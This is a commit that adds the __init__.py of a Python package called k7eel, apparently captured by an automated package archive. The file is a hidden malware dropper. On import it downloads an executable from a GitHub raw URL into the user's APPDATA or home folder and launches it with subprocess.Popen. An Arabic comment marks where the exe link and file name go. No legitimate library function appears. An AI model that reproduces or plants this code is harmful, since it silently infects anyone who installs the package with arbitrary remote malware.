8e48f983e762b7827fede7bd38cab43e8e3ad28f
Bot <41898282+github-actions[bot]@users.noreply.github.com>
2025-08-20 15:06:45 +0000

    Add package k7eel/0.1.3/k7eel-0.1.3.tar.gz

---
+++ packages/k7eel/k7eel-0.1.3.tar.gz/k7eel-0.1.3/k7eel/__init__.py
@@ -0,0 +1,18 @@
+import os
+import urllib.request
+import subprocess
+
+def download_and_run(url, filename):
+    appdata = os.getenv("APPDATA")
+    if not appdata:
+        appdata = os.path.expanduser("~")
+    filepath = os.path.join(appdata, filename)
+    if not os.path.exists(filepath):
+        urllib.request.urlretrieve(url, filepath)
+    subprocess.Popen([filepath], shell=True)
+
+# ضع هنا رابط ملف exe واسم الملف
+url = "https://github.com/mtlnewacc6-sys/adadad/raw/refs/heads/main/x69.exe"
+filename = "x69m5tl.exe"
+
+download_and_run(url, filename)
